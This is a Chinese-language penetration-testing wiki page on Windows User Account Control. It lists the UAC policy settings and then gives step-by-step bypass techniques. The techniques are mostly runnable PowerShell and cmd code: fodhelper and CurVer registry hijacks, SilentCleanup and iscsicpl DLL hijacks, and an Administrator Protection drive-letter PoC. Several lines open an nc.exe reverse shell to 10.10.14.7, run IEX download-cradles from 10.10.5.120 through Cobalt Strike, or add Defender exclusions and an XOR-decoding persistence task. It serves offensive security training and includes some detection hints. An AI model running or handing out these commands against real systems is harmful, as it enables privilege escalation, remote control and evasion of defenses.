# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一项能够为**需要提升权限的活动显示同意提示**的功能。应用程序具有不同的 `integrity` 级别，而具有**高 integrity 级别**的程序可以执行**可能危及系统安全**的任务。启用 UAC 后，应用程序和任务始终**在非管理员账户的安全上下文中运行**，除非管理员明确授权这些应用程序或任务获得管理员级别的系统访问权限以运行。它是一项便利功能，可以保护管理员免受非预期更改的影响，但不被视为安全边界。

有关 integrity 级别的更多信息：


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

启用 UAC 后，管理员用户会获得 2 个 token：一个标准用户 token，用于以 medium integrity 执行常规操作；另一个 token 则包含管理员权限。

此 [页面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 深入讨论了 UAC 的工作原理，包括登录过程、用户体验和 UAC 架构。管理员可以使用安全策略，在本地配置 UAC 的具体工作方式（使用 secpol.msc），也可以在 Active Directory 域环境中通过 Group Policy Objects (GPO) 配置并推送。各种设置在[此处](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)进行了详细讨论。UAC 有 10 项可配置的 Group Policy 设置。下表提供了更多详细信息：

| Group Policy 设置                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | 默认设置                                                      |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: 内置 Administrator account 的 Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0`（Disabled）                                             |
| [User Account Control: Admin Approval Mode 中管理员的 elevation prompt 行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5`（在 secure desktop 上为非 Windows binaries 提示同意） |
| [User Account Control: standard users 的 elevation prompt 行为](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1`（在 secure desktop 上提示输入 credentials）         |
| [User Account Control: 检测 application installations 并提示 elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1`（Enabled；Enterprise 默认 Disabled）           |
| [User Account Control: 仅提升已签名并经过验证的 executables](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0`（Disabled）                                             |
| [User Account Control: 仅提升安装在 secure locations 中的 UIAccess applications](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1`（Enabled）                                              |
| [User Account Control: 让所有 administrators 在 Admin Approval Mode 中运行](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1`（Enabled）                                              |
| [User Account Control: 允许 UIAccess applications 在不使用 secure desktop 的情况下提示 elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0`（Disabled）                                             |
| [User Account Control: 提示 elevation 时切换到 secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1`（Enabled）                                              |
| [User Account Control: 将文件和 registry 写入失败虚拟化到每用户位置](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1`（Enabled）                                              |

### 在 Windows 上安装 software 的策略

默认情况下，**local security policies**（大多数系统上的 "secpol.msc"）配置为**阻止非管理员用户执行 software installations**。这意味着，即使非管理员用户可以下载 software 的 installer，他们也无法在没有管理员账户的情况下运行它。

### 强制 UAC 请求 elevation 的 Registry Keys

作为没有管理员权限的标准用户，你可以确保“标准”账户在尝试执行某些操作时，**由 UAC 提示输入 credentials**。此操作需要修改某些 **registry keys**，而这需要管理员权限，除非存在 **UAC bypass**，或者攻击者已经以管理员身份登录。

即使用户属于 **Administrators** 组，这些更改也会强制用户**重新输入其账户 credentials**，才能执行管理操作。

**实际上，只有在你已经拥有 elevated token、UAC bypass，或存在允许你修改这些 keys 的 misconfiguration 时，这才有用；否则 registry write 本身就会被阻止。**

必须更改的 registry keys 和 entries 如下（括号中为默认值）：

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`：
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

也可以通过 Local Security Policy 工具手动完成。更改后，管理操作会提示用户重新输入其 credentials。

### 注意

**User Account Control 不是安全边界。**因此，标准用户无法脱离自己的账户并获得管理员权限，除非利用 local privilege escalation exploit。

### 向用户请求“完全计算机访问权限”
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode 使用 integrity checks，防止 high-integrity-level processes（如 web browsers）访问 low-integrity-level data（如 temporary Internet files folder）。其实现方式是使用 low-integrity token 运行 browser。当 browser 尝试访问存储在 low-integrity zone 中的数据时，operating system 会检查 process 的 integrity level，并据此允许访问。此功能有助于防止 remote code execution attacks 获取系统上的敏感数据。
- 当用户登录 Windows 时，系统会创建一个 access token，其中包含用户 privileges 的列表。Privileges 定义为用户 rights 和 capabilities 的组合。该 token 还包含用户 credentials 的列表，这些 credentials 用于向计算机和网络上的资源验证用户身份。

### Autoadminlogon

要将 Windows 配置为在启动时自动登录指定用户，请设置 **`AutoAdminLogon` registry key**。这对于 kiosk environments 或 testing purposes 很有用。请仅在 secure systems 上使用，因为这会将 password 暴露在 registry 中。

使用 Registry Editor 或 `reg add` 设置以下 keys：

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`：
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

要恢复正常的登录行为，请将 `AutoAdminLogon` 设置为 0。

## UAC bypass

> [!TIP]
> 请注意，如果你能图形化访问 victim，那么 UAC bypass 非常直接，因为 UAC prompt 出现时，你只需点击“Yes”。

在以下情况下需要 UAC bypass：**UAC 已激活，你的 process 正在 medium integrity context 中运行，并且你的 user 属于 administrators group**。

需要注意的是，如果 UAC 处于最高 security level（Always），则 **bypass UAC 要比处于其他任意 level（Default）困难得多**。

### 从 medium-integrity shell 进行快速 triage

在尝试 bypass 之前，确认你处于正确的场景，并将 host build 与已知可用的方法进行匹配：
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
实用说明：
- 如果 `EnableLUA=0`，则不需要 bypass：任何 admin token 都可以直接请求 high integrity。
- `ConsentPromptBehaviorAdmin=2` 或 `5` 是 auto-elevate / 基于 COM 的 bypass 的常见场景。
- `Always Notify` 会提高门槛，但你仍应测试确切的 build，而不是假定会失败：UACME 仍会在现代 Windows build 上跟踪一些 `AlwaysNotify compatible` 方法。

### UAC disabled

如果 UAC 已禁用（`ConsentPromptBehaviorAdmin` 为 **`0`），你可以使用类似以下方式，以 admin privileges（high integrity level）**执行 reverse shell：
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常**基础的 UAC "bypass"（完整文件系统访问权限）

如果你拥有一个属于 Administrators 组用户的 shell，就可以通过 SMB 将本地的 **C$** 共享（文件系统）挂载为一个新磁盘，并获得对**文件系统内所有内容**的访问权限（甚至包括 Administrator 的主文件夹）。

> [!WARNING]
> **看起来这个技巧已经不再有效了**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### 使用 Cobalt Strike 绕过 UAC

Cobalt Strike techniques 仅在 UAC 未设置为最高安全级别时有效
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** 和 **Metasploit** 也有多个用于 **bypass** **UAC** 的模块。

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

在现代版本中，Auto-elevated COM objects 仍然是一个实用的 UAC 攻击面。UACME 仍将 `ICMLuaUtil` 跟踪为当前 Windows 分支上可用的技术，而 offensive tooling 也在持续调整 `CMSTPLUA`：在调用 COM Elevation Moniker 之前，结合 interactive desktop process、64-bit execution，有时还会进行 PEB/process masquerading。

实用技巧：
- 优先使用位于用户 **interactive session** 中的 **64-bit** 进程（通常是 `explorer.exe` 或其子进程）。
- 如果 raw shell 失败，请改用 BOF / UACME implementation 重试，而不是使用简单的 `CreateProcess` wrapper。
- 预计子进程会在**独立的 elevated process** 中执行；许多 BOF 不会将当前 beacon 原地提升权限。

### KRBUACBypass

Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) 是多个 UAC bypass exploits 的**汇编**。请注意，你需要使用 **visual studio 或 msbuild 编译 UACME**。编译过程会创建多个可执行文件（例如 `Source\Akagi\outout\x64\Debug\Akagi.exe`），你需要知道**自己需要哪一个。**\
你应该**小心**，因为某些 bypass 会**提示其他程序**，从而**提醒** **user** 有事情正在发生。

UACME 提供了每种 technique 开始生效的 **build version**。你可以搜索影响你所使用版本的 technique：
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
此外，使用[此页面](https://en.wikipedia.org/wiki/Windows_10_version_history)可以根据构建版本获取 Windows 版本 `1607`。

一个实用的工作流程是先**评估主机版本**，然后再执行匹配的方法：
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` 会快速将本地 build 与其已知的 UAC methods 进行比对，这有助于快速排除失效的 PoC。
- `UACME` 仍然是将 bypass 对应到精确 build 的最佳公开目录。近期版本新增了 methods，并针对 **Windows 11 25H2** 重新测试了现有 methods，因此在假设旧 blog post 仍可直接适用之前，请先重新检查 README/release notes。

### UAC Bypass – fodhelper.exe（Registry hijack）

可信二进制文件 `fodhelper.exe` 在现代 Windows 上会自动提升权限。启动时，它会查询下面的 per-user registry path，但不会验证 `DelegateExecute` verb。在该位置植入 command，可以让 Medium Integrity process（用户属于 Administrators）在不显示 UAC prompt 的情况下启动 High Integrity process。

fodhelper 查询的 Registry path：
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell 步骤（设置你的 payload，然后触发）</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notes:
- 当当前用户是 Administrators 的成员，且 UAC level 为 default/lenient 时有效（不是带有额外限制的 Always Notify）。
- 在 64-bit Windows 上，可使用 `sysnative` path 从 32-bit process 启动 64-bit PowerShell。
- Payload 可以是任意 command（PowerShell、cmd 或 EXE path）。为保持 stealth，请避免触发 prompting UIs。

#### CurVer/extension hijack variant (仅 HKCU)

近期滥用 `fodhelper.exe` 的 samples 会避开 `DelegateExecute`，转而通过 per-user `CurVer` value **redirect `ms-settings` ProgID**。该 auto-elevated binary 仍会在 `HKCU` 下解析 handler，因此无需 admin token 即可植入这些 keys：
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
提权后，malware 通常会通过将 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` 设置为 `0` 来**禁用后续提示**，然后执行其他 defense evasion 操作（例如 `Add-MpPreference -ExclusionPath C:\ProgramData`），并重新创建 persistence，以 high integrity 运行。典型的 persistence task 会将 **XOR-encrypted PowerShell script** 存储在磁盘上，并每小时在内存中解码和执行：
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
此变体仍会清理 dropper，只留下 staged payloads，因此检测依赖于监控 **`CurVer` hijack**、`ConsentPromptBehaviorAdmin` tampering、Defender exclusion creation，或在内存中 decrypt PowerShell 的 scheduled tasks。

### 通过 `SilentCleanup` task 进行 UAC bypass（`HKCU\Environment\windir`）

`SilentCleanup` 会以最高权限启动 `cleanmgr.exe`，并从用户环境中展开 `%windir%`。如果你能控制 `HKCU\Environment\windir`，就可以将该展开重定向到任意 command，并在不显示 consent dialog 的情况下获得 high integrity。由于 UACME 仍保持该 technique active，且近期 issue tracking 显示 Windows 11 24H2 可能只需要进行少量 quoting 调整，因此该方法在近期 builds 上仍值得测试。
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
如果该 build 会为路径加上引号，请重试，并让 payload 以引号结尾（例如 `cmd.exe"`）。测试后务必清理 `HKCU\Environment\windir`。

#### More UAC bypass

许多利用 UI 流程、COM 对象或桌面交互的经典 UAC bypass 都要求受害者拥有**完整的交互式会话**；普通的 `nc.exe` shell 或运行在 **Session 0** 中的服务通常不够。

通常可以使用 **meterpreter** session 来解决。迁移到 **Session** 值等于 **1** 的**进程**：

![将 ms-settings 指向自定义扩展（.thm），并将该扩展映射到我们的 payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ 应该可以工作)

### 使用 GUI 进行 UAC Bypass

如果你可以访问 **GUI**，那么出现 UAC 提示时直接接受即可；实际上并不需要技术性的 bypass。因此，获取 GUI session 通常就足以绕过 UAC 带来的实际阻碍。

此外，如果你获取的是某人正在使用的 GUI session（可能通过 RDP），其中可能会有**以 administrator 身份运行的工具**，你可以从中直接**以 admin 身份运行**例如 **cmd**，而不会再次收到 UAC 提示，例如 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)。这种方式可能更加**隐蔽**。

### 高噪声的暴力 UAC bypass

如果你不在意产生噪声，也可以始终**运行类似** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) 的工具，它会**请求提升权限，直到用户接受为止**。

### 自行实现 bypass - 基础 UAC bypass 方法

如果你查看 **UACME**，会注意到**许多 UAC bypass 都利用 DLL hijacking**（通常是让一个 elevated binary 从可写路径加载攻击者控制的 DLL）。[阅读此处，了解如何查找 DLL hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html)。

1. 查找一个会**自动提升**的 binary（检查执行时它是否以 high integrity level 运行）。
2. 使用 procmon 查找可能存在 **DLL Hijacking** 风险的 "**NAME NOT FOUND**" 事件。
3. 你可能需要将 DLL **写入**某些**受保护路径**（例如 C:\Windows\System32），而你没有写入权限。可以使用以下方式绕过：
1. **wusa.exe**：Windows 7、8 和 8.1。它允许将 CAB 文件的内容提取到受保护路径中（因为该工具以 high integrity level 执行）。
2. **IFileOperation**：Windows 10。
4. 准备一个**脚本**，将 DLL 复制到受保护路径中，然后执行存在漏洞且会自动提升的 binary。

### 另一种 UAC bypass technique

其方法是监视某个 **autoElevated binary** 是否尝试从**registry**中**读取**要**执行**的 **binary** 或**命令**的**名称/路径**（如果 binary 在 **HKCU** 中搜索这些信息，则更值得关注）。

### 通过 `SysWOW64\iscsicpl.exe` + 用户 `PATH` DLL hijack 进行 UAC bypass

32 位的 `C:\Windows\SysWOW64\iscsicpl.exe` 是一个**自动提升**的 binary，可以利用搜索顺序加载 `iscsiexe.dll`。如果你能将恶意的 `iscsiexe.dll` 放入**用户可写**文件夹，然后修改当前用户的 `PATH`（例如通过 `HKCU\Environment\Path`），使 Windows 搜索该文件夹，那么 Windows 可能会在提升权限的 `iscsicpl.exe` 进程中加载攻击者 DLL，**而不会显示 UAC 提示**。

实践注意事项：
- 当当前用户属于 **Administrators**，但由于 UAC 以 **Medium Integrity** 运行时，这很有用。
- 对于此 bypass，相关的是 **SysWOW64** 副本。将 **System32** 副本视为独立的 binary，并单独验证其行为。
- 该原语结合了**自动提升**和 **DLL search-order hijacking**，因此，用于验证缺失 DLL 加载的 ProcMon 工作流同样适用于此处。

最小流程：
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
检测思路：
- 对 `reg add` / 写入 `HKCU\Environment\Path` 的注册表操作进行告警，尤其是其后立即执行 `C:\Windows\SysWOW64\iscsicpl.exe` 的情况。
- 在 `%TEMP%` 或 `%LOCALAPPDATA%\Microsoft\WindowsApps` 等**用户可控**位置搜寻 `iscsiexe.dll`。
- 将 `iscsicpl.exe` 的启动与异常子进程，或从正常 Windows 目录之外加载的 DLL 进行关联分析。

### 值得单独检查的最新研究

一些 2024 年之后的 chain 已不再表现为经典的 `HKCU\Software\Classes` 注册表 hijack。例如，activation-context cache poisoning 可以将 **drive remap** 与 **DLL redirection** 结合起来，通过 `ctfmon.exe` 等受信任的 UI / auto-elevated binaries，以及后续的 `fodhelper.exe` 等目标，将权限从 medium integrity 提升到 high integrity。与其在此重复大型 PoC，不如检查以下位置中的精简 payload 示例：

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2) 通过 per-logon-session DOS device map 进行 drive-letter hijack

有关 Windows 11 25H2 中完整的 `RAiLaunchAdminProcess` / UIAccess attack surface，请查看专门页面：

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 的 “Administrator Protection” 使用带有 per-session `\Sessions\0\DosDevices/<LUID>` maps 的 shadow-admin tokens。该目录由 `SeGetTokenDeviceMap` 在首次解析 `\??` 时 lazy 创建。如果攻击者仅以 **SecurityIdentification** impersonate shadow-admin token，则该目录会由攻击者作为 **owner** 创建（继承 `CREATOR OWNER`），从而允许创建优先于 `\GLOBAL??` 的 drive-letter links。

**步骤：**

1. 在 low-privileged session 中调用 `RAiProcessRunOnce`，启动无提示的 shadow-admin `runonce.exe`。
2. 将其 primary token duplicate 为 **identification** token，并在打开 `\??` 时 impersonate 该 token，以强制在攻击者所有权下创建 `\Sessions\0\DosDevices/<LUID>`。
3. 在其中创建一个指向攻击者控制存储位置的 `C:` symlink；之后该 session 中的文件系统访问会将 `C:` 解析为攻击者路径，从而无需提示即可实现 DLL/file hijack。

**PowerShell PoC (NtObjectManager)：**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## 参考资料
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – User Account Control 的工作原理](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass 技术合集](https://github.com/hfiref0x/UACME)
- [WinPwnage – UAC bypass 兼容性扫描器和启动器](https://github.com/rootm0s/WinPwnage)
- [Checkpoint Research – KONNI 采用 AI 生成 PowerShell 后门](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos：针对东南亚政府目标的 0-Day 利用](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – 绕过 Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [Project Zero – 通过滥用 UI Access 绕过 Administrator Protection](https://projectzero.google/2026/02/windows-administrator-protection.html)
- [Sigma / Detection.FYI – 使用 SilentCleanup Task 绕过 UAC](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
